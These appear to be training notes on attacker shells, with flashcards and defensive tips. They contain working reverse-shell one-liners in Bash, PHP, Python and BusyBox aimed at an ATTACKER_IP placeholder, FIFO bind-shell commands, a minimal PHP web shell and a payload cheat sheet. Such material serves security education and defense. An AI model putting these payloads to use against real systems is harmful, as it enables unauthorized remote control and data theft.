## Shells 

### What is a shell?

* A *shell* is the interface (usually CLI) that allows a user or process to interact with an OS.
* In security, a **shell** usually means an interactive session attackers use on a compromised host to run commands, escalate privileges, exfiltrate data, persist, and pivot.

---

### High-level attack lifecycle enabled by shell access

* **Remote control** - run commands and tools.
* **Privilege escalation** - attempt to gain root/ADMIN.
* **Data exfiltration** - locate and copy sensitive files.
* **Persistence** - backdoors, accounts, scheduled jobs.
* **Post-exploitation** - deploy malware, clean logs.
* **Pivoting** - use the host as a jump point to other network targets.

---

### Types of shells (quick)

* **Reverse shell** - target connects back to attacker (good for bypassing outbound firewall rules).
* **Bind shell** - target listens on a port; attacker connects in (requires open inbound port on target).
* **Web shell** - script uploaded to a web server that executes commands via HTTP.

---

### Reverse shell (essence + example)

* **How it works:** compromised host initiates a connection to a listener on attacker machine.
* **Why use:** evades firewall restrictions on inbound connections.

**Typical listener (Netcat):**

```bash
nc -lvnp 443
# -l listen, -v verbose, -n no DNS, -p port
```

**Pipe-style example payload (Bash):**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

* Uses a named pipe (FIFO) to enable bidirectional I/O.

**Common ports used to blend with normal traffic:** 53, 80, 443, 8080, 139, 445

---

### Bind shell (essence + example)

* **How it works:** target binds a port and waits for attacker to connect.
* **When used:** when outbound connections are blocked but attacker can reach an open port on target.
* **Downside:** persistent listener may be detected.

**Bind example on target:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Attacker connects:**

```bash
nc -nv TARGET_IP 8080
```

* Ports < 1024 require elevated privileges on the host.

---

### Shell listeners (tools to interact with incoming shells)

* **Netcat (nc):** simple, ubiquitous listener.
* **rlwrap:** adds readline (arrow keys, history) to programs that lack it. Example: `rlwrap nc -lvnp 443`.
* **ncat (Nmap):** Netcat variant with extra features (SSL, etc.). Example: `ncat --ssl -lvnp 4444`.
* **socat:** flexible socket relay tool - create complex socket connections. Example: `socat -d -d TCP-LISTEN:443 STDOUT`.

---

### Common shell payload families (select examples)

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
# or
bash -i 5<>/dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### PHP (web environments)

```php
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

* PHP variants: `exec`, `shell_exec`, `system`, `passthru`, `popen`.

### Python

```bash
python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

* `subprocess` and `os` modules commonly used in crafted payloads.

### Other quick options

* **BusyBox:** `busybox nc ATTACKER_IP 443 -e sh`
* **Telnet/awk** and other language-based one-liners exist for constrained environments.

---

### Web shells (concise)

* A web shell is a script that accepts commands via HTTP and runs them on the server (languages: PHP, ASP, JSP, CGI).
* Typical upload vectors: **Unrestricted File Upload**, Local File Inclusion, Command Injection, compromised credentials.

**Minimal PHP web shell:**

```php
<?php
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
?>
```

* Access: `http://victim/uploads/shell.php?cmd=whoami`

**Famous/more-featured examples:** p0wny-shell (minimal), b374k, c99 (feature-rich).

---

### Quick Q&A (flashcards)

* **Q:** What CLI lets users interact with an OS? - **A:** Shell
* **Q:** Attacker uses compromised system to reach others - **A:** Pivoting
* **Q:** Common post-access activity to increase rights - **A:** Privilege Escalation
* **Q:** Shell where the target connects back? - **A:** Reverse Shell
* **Q:** Tool to set up reverse listener? - **A:** Netcat (nc)
* **Q:** Shell that opens a port on target? - **A:** Bind Shell
* **Q:** Listening below which port requires root? - **A:** 1024
* **Q:** Tool that provides readline editing for listeners? - **A:** rlwrap
* **Q:** Nmap-distributed Netcat variant offering SSL? - **A:** ncat
* **Q:** Tool for creating socket connections between data sources? - **A:** socat
* **Q:** PHP functions used for remote shell execution? - **A:** exec, shell_exec, system, passthru, popen
* **Q:** Python module often used to spawn reverse shells / manage processes? - **A:** subprocess
* **Q:** Vulnerability that allows uploading malicious scripts? - **A:** Unrestricted File Upload
* **Q:** Malicious uploaded script for remote web server access? - **A:** Web Shell

---

### Quick reference (cheat-sheet)

* Listener: `nc -lvnp <port>`
* Better interactive: `rlwrap nc -lvnp <port>`
* Encrypted listener: `ncat --ssl -lvnp <port>`
* Socat listen: `socat -d -d TCP-LISTEN:<port> STDOUT`
* Bash reverse: `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`
* Bind example: `nc -l 0.0.0.0 8080 -e /bin/bash` (if nc supports `-e`)

---

### Safety & defensive notes (ops-focused)

* Monitor unusual outbound connections (to uncommon IPs/ports), especially from servers.
* Watch for long-lived listeners or processes spawning `nc`, `ncat`, `socat`, `python`, `bash` with network sockets.
* Restrict file uploads, enforce validation and content scanning.
* Harden web servers: remove unsafe functions, run as least-privileged user, use WAF, apply strict upload rules.
* Use endpoint detection to flag interactive shells and post-exploitation behaviors.

